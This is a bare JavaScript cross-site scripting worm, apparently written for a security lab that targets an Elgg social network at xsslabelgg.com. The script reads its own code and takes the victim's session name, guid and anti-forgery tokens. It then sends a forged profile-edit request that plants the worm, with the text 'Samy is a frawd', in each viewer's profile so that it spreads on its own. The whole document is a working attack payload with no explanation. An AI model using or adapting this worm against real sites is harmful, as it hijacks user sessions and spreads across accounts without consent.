<script type="text/javascript" id="worm">
window.onload = function(){
	var headerTag = "<script id=\"worm\" type=\"text/javascript\">"; 
	var jsCode = document.getElementById("worm").innerHTML;
	var tailTag = "</" + "script>";                                 

	// Put all the pieces together, and apply the URI encoding
	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag); 

	// Set the content of the description field and access level.
	var des = "&description=Samy is a frawd" + wormCode + "&accesslevel[description]=2";                       

	// Get the name, guid, timestamp, and token.
	var name = "&name=" + elgg.session.user.name;
	var guid = "&guid=" + elgg.session.user.guid;
	var ts    = "&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token = "&__elgg_token="+elgg.security.token.__elgg_token;

	// Set the URL
	var samGuid=47;    //Samy is the attacker

	var sendurl="http://www.xsslabelgg.com/action/profile/edit";
	var content = token + ts + name + des + guid;

	// Construct and send the Ajax request
	if (elgg.session.user.guid != samGuid){
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax = new XMLHttpRequest();
		Ajax.open("POST", sendurl,true);
	Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	Ajax.send(content);
	}
}
</script>
